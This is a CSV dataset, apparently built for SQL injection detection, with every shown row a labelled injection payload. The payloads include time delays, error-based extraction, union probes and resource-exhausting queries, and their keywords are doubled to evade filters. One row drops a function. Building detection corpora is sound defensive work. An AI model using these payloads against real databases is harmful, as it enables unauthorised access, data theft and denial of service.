Query,Label
waitfoorr delay '0:0:5' anandd    (    (   '%'  =  ',1
"1""  )   anandd make_sesett  (  8403  =  8403,8899  )   anandd   (  ""dhss""  =  ""dhss",1
-3880  )   oorr 4144  =    (  seleselectct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual  )   anandd   (  5194  =  5194,1
1'+  (  seleselectct 'qxmo' whwhereere 9511  =  9511 rllikeike   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1'  )   anandd exp  (  ~  (  seselectlect * frfromom   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd   (  'cuat'  =  'cuat",1
"  (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  srmq  )   aandnd ""plqe""  =  ""plqe",1
"1%'   )    )     )   union all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1'   )    )     )   oorr 5356  =    (  seselectlect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-7963'+  (  seselectlect 'kxzh' whewherere 7039  =  7039 union all seselectlect 7039,7039,7039,7039,7039,7039--",1
"1"" oorr 9643  =    (  selselectect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  ",1
"-5516'+  (  selecselectt 'bmlv' whwhereere 7188  =  7188 union all selecselectt 7188,7188,7188,7188,7188,7188,7188,7188#",1
1 wherwheree 7055  =  7055,1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   anandd    (    (     (  ""%""  =  """,1
"-2626%'  )   oorr elt  (  7513  =  8586,8586  )   anandd   (  '%'  =  '",1
"1'||  (  selecselectt 'iwlj' wwherehere 8704  =  8704 aandnd   (  selecselectt 9067 frfromom  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a   )    )   ||'",1
"1'  )   aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sselectelect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd   (  'vkde'  =  'vkde",1
"1  )   as zbha wwherehere 9700  =  9700 oorr 6979  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   wwherehere 5938  =  5938 anandd   (  seleselectct * ffromrom   (  seleselectct  (  sleep  (  5   )    )     )  gcrr  )  #",1
1   )    )     )   rlilikeke   (  selselectect * frofromm   (  selselectect  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-3868'   )    )    oorr make_ssetet  (  6809  =  1236,1236  )   aandnd    (    (   'evnj'  =  'evnj",1
"-2365   )    )    union all selecselectt 8190,8190#",1
-2039'  )   oorr 2724 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"1'+  (  selselectect pwvr wherwheree 3028  =  3028 oorr 6979  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
1'  )   wherwheree 6440  =  6440 oorr   (  sselectelect * frfromom   (  sselectelect  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""   )    )    anandd 2716  =    (  selecselectt count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" wwherehere 1115  =  1115 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1%"" oorr   (  sselectelect 2*  (  if   (    (   sselectelect * frofromm   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd ""%""  =  """,1
"-3436  )   oorr elt  (  1032  =  1032,3623  )  ",1
"1' oorr 9643  =    (  seleselectct count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )  ",1
"1%'  )   union all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1%'   )    )     )   anandd 3202  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd    (    (     (  '%'  =  '",1
"1""   )    )    oorr   (  selselectect 2*  (  if   (    (   selselectect * ffromrom   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd    (    (   ""qgle"" lilikeke ""qgle",1
1'||  (  selecselectt 'lxyu' frofromm dual whewherere 5789  =  5789 union all selecselectt nunullll#,1
" selecselectt sleep  (  5  )   anandd    (    (     (  ""zlal""  =  ""zlal",1
"1%""   )    )     )   union all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
"sselectelect count  (  *  )   frofromm generate_series  (  1,5000000  )   anandd    (    (   ""%""  =  """,1
"1'||  (  seselectlect 'drna' ffromrom dual wwherehere 5082  =  5082 anandd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1
"1%"" anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd ""%""  =  """,1
"1 union all seselectlect nnullull,nnullull,nnullull,nnullull#",1
"1%""  )   union all seselectlect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"-9356 oorr elt  (  1032  =  1032,3623  )  -- izgi",1
1   )    )    oorroorrderder bbyy 1#,1
"1'   )    )     )   union all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1""   )    )    as yosd whewherere 1255  =  1255",1
"1%""   )    )    oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nnullull  )  --",1
"1""  )   as kslq wherwheree 8669  =  8669 anandd 8635  =    (  sselectelect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"1"" union all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1'   )    )     )   aandnd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1  )   aandnd 7533  =  7533 aandnd   (  7175  =  7175,1
"1""   )    )    anandd 7533  =  7533 anandd    (    (   ""gkca""  =  ""gkca",1
"-4711%""   )    )    union all selecselectt 6737,6737,6737,6737#",1
-7675%'   )    )     )   oorrdeoorrderr bbyy 1--,1
1'+  (  selecselectt goec wwherehere 9460  =  9460 rllikeike   (  selecselectt   (  case when   (  4740  =  1203  )   then 1 else 0x28 end   )    )     )  +',1
1'  )   whwhereere 3730  =  3730 aandnd sleep  (  5  )  #,1
"1'+  (  selecselectt iaeu whewherere 5509  =  5509 oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'||  (  selecselectt 'bmyt' ffromrom dual wherwheree 9407  =  9407 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )     )  ||'",1
"1  )   wwherehere 8671  =  8671 aandnd make_ssetet  (  4931  =  1642,1642  )  --",1
-3596   )    )     )   oorr 5903  =    (  'qqpjq'||  (  sselectelect case 5903 when 5903 then 1 else 0 end frofromm rdb$datadatabasebase  )  ||'qzvzq'  )   anandd    (    (     (  3645  =  3645,1
-2431'  )   oorr 8571  =  8571--,1
"-8599   )    )    oorr elt  (  5628  =  2324,2324  )   anandd    (    (   1134  =  1134",1
"1 oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nulnulll  )  ",1
"selecselectt count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 aandnd    (    (   'rkoe'  =  'rkoe",1
"1'  )   as jxqt whwhereere 4322  =  4322 oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
"-8919"" oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd ""nstr""  =  ""nstr",1
"-9136%""  )   union all selecselectt 3081,3081,3081,3081,3081,3081,3081#",1
"1"" whwhereere 6325  =  6325 union all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1%""   )    )    union all selselectect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1%"" aandnd 2006  =  2006",1
"-2852%'  )   oorr 1 group bbyy concat  (  0x7171706a71,  (  selselectect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"1%'   )    )     )   oorr 5356  =    (  sselectelect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-5327'   )    )     )   oorr 1606  =  6099,1
"-2518' union all seselectlect 6818,6818,6818,6818,6818,6818#",1
"-8654' union all seleselectct 7190,7190,7190,7190,7190#",1
"1'  )   oorr 4411  =    (  selselectect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd   (  'wgbh'  =  'wgbh",1
-7444   )    )     )   oorr 1342  =  9774,1
"1'   )    )    union all sselectelect nunullll,nunullll,nunullll#",1
"1'  )   as mmhe whwhereere 2142  =  2142 oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"-1000"" oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd ""iissbq""  =  ""iissbq",1
"1'  )   aandnd   (  seleselectct 9067 frfromom  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   aandnd   (  'qvrd'  =  'qvrd",1
"1%""   )    )     )   union all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1'   )    )     )    (  seleselectct   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frfromom   (  vvaluesalues  (  0   )    )     )   aandnd    (    (     (  'nets' llikeike 'nets",1
"1"" whewherere 5517  =  5517 aandnd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%""  )   aandnd 9254  =    (  seselectlect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'   )    )    oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   anandd    (    (   'kmjn'  =  'kmjn",1
1  )   wwherehere 3671  =  3671,1
"1'   )    )    anandd exp  (  ~  (  seleselectct * frofromm   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd    (    (   'kqqf'  =  'kqqf",1
1' rliklikee   (  seselectlect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1
"1'   )    )     )   oorr 4411  =    (  seleselectct count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (     (  'narn'  =  'narn",1
"1',  (  seselectlect   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  seselectlect 3717 ffromrom master..sysdatabdatabaseases  )   end   )    )   ",1
"1  )   wherwheree 5234  =  5234 oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"seselectlect * ffromrom generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   lilimitmit 1--",1
"1"" whewherere 1140  =  1140 oorr 2367  =    (  seselectlect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1 union all seselectlect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
if  (  1665  =  3845  )   sselectelect 1665 else ddroprop function nzod--,1
"1'   )    )    union all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1 oorr 8421  =    (  sselectelect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   -- xgyc",1
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   aandnd '%'  =  '",1
"1  )   wwherehere 9829  =  9829 oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1%'  )   oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%'   )    )    oorr 7417  =    (  selselectect count  (  *  )   frofromm sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )  --",1
"-3082""  )   wwherehere 1082  =  1082 oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-4104%' oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd '%'  =  ',1
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   aandnd    (    (   'bacm'  =  'bacm",1
sselectelect   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  sselectelect 8618 frofromm mysql.db  )   end  )  #,1
"-2605""  )   oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd   (  ""cikb"" liklikee ""cikb",1
1   )    )     )   oorr 4240  =    (  selselectect 4240 frofromm pg_sleep  (  5   )    )   --,1
"1'qhfy<'"">utwq",1
1  )   wherwheree 1120  =  1120,1
"1""  )   oorroorrderder bbyy 1#",1
"1%' oorr 6979  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"seselectlect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 anandd    (    (     (  ""dskh""  =  ""dskh",1
"1%""   )    )    aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (   ""%""  =  """,1
"1""   )    )    as wooq wwherehere 7671  =  7671 anandd row  (  6237,7469  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom   (  seleselectct 5192 union seleselectct 3785 union seleselectct 3931 union seleselectct 7158  )  a group bbyy x  )  --",1
1   )    )    as wwkw whwhereere 7289  =  7289 aandnd 7533  =  7533--,1
"1' oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1"" whewherere 4450  =  4450 oorr 6979  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1%'   )    )    oorr   (  seselectlect 9173 ffromrom  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   anandd    (    (   '%'  =  '",1
1' whwhereere 5778  =  5778,1
-8860  )   oorr 4144  =    (  selecselectt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual  ) ,1
"-1874""  )   as wgpj wwherehere 6481  =  6481 oorr 3629  =  3459",1
"1'  )   aandnd 8407  =    (  seselectlect count  (  *  )   frfromom generate_series  (  1,5000000   )    )    aandnd   (  'lwrk' liklikee 'lwrk",1
"1%"" rllikeike   (  selecselectt   (  case when   (  5135  =  9839  )   then 1 else 0x28 end   )    )    anandd ""%""  =  """,1
"selselectect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 anandd   (  9481  =  9481",1
"1' iinn boolean mode  )   anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  #",1
-3185'   )    )    oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aandnd    (    (   'rknd' llikeike 'rknd,1
"1""  )   oorr   (  selselectect 9173 frfromom  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   aandnd   (  ""njdu"" lilikeke ""njdu",1
1%'   )    )     )   anandd 2444  =  9282#,1
"-3975'  )   oorr make_sesett  (  1943  =  3499,3499  )   aandnd   (  'dawb'  =  'dawb",1
"-8021""  )   union all sselectelect 1166,1166,1166,1166--",1
1'||  (  seleselectct 'rjun' whewherere 8868  =  8868 aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1
"1   )    )    as zkrr whwhereere 4730  =  4730 oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1%""   )    )     )   oorr 2367  =    (  sselectelect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1   )    )     )   aandnd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   aandnd    (    (     (  6578  =  6578",1
1' wherwheree 2661  =  2661,1
"-4686""  )   as dxks wherwheree 7123  =  7123 oorr elt  (  1032  =  1032,3623  )  --",1
"1"" oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )   aandnd ""dtwv"" llikeike ""dtwv",1
"1""  )   as aifd wherwheree 5962  =  5962",1
"1'   )    )     )   aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nunullll  )   aandnd    (    (     (  'sjxp' liklikee 'sjxp",1
"-9487   )    )    as rvck whewherere 9404  =  9404 oorr make_sesett  (  8921  =  6045,6045  )  --",1
"1'  )   as eany wherwheree 3169  =  3169 aandnd 6414  =    (  selselectect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'   )    )     )   waitfoorr delay '0:0:5' anandd    (    (     (  'wvzb'  =  'wvzb,1
"waitfoorr delay '0:0:5' aandnd   (  ""dmcu""  =  ""dmcu",1
 (  selecselectt   (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  3287  =  3287  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1   )    )     )   anandd uupdatepdatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   anandd    (    (     (  5199  =  5199",1
-3648' wherwheree 4629  =  4629 ooorrderrder bbyy 1--,1
"1'  )   as irsh whewherere 4973  =  4973 oorr 7552  =    (  selselectect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%' anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   anandd '%'  =  '",1
1  )   as mpnj whewherere 5049  =  5049,1
1'  )   as hqaq wherwheree 6411  =  6411 anandd 8594  =    (  seselectlect 8594 ffromrom pg_sleep  (  5   )    )   --,1
"1'  )   anandd updaupdatetexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
"-9031%""  )   oorroorrderder bbyy 1--",1
"1  )   as jqbv wwherehere 8172  =  8172 aandnd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"iif  (  9134  =  5736,1,1/0  )  ",1
1' aandnd 2006  =  2006,1
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect 1 frofromm generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   llimitimit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
"1' oorr 9643  =    (  seselectlect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3  )   anandd 'mvkg'  =  'mvkg",1
"-1525'   )    )     )   union all selselectect 4110,4110,4110,4110,4110,4110#",1
"1'  )   oorr 4915  =    (  selecselectt count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )  --",1
"1%'   )    )     )   aandnd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    aandnd    (    (     (  '%'  =  '",1
"1""  )   wherwheree 3321  =  3321",1
1'+  (  selecselectt nsri whewherere 1202  =  1202 aandnd 4595  =  4595#,1
"1'+  (  seselectlect xlvq wwherehere 7470  =  7470 anandd 3707  =    (  seselectlect count  (  *  )   frofromm sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3   )    )   +'",1
"-1204'   )    )    union all seleselectct 3585,3585--",1
1  )   whewherere 4711  =  4711,1
"-7491""  )   as cnrn whewherere 3635  =  3635 oorroorrderder bbyy 1#",1
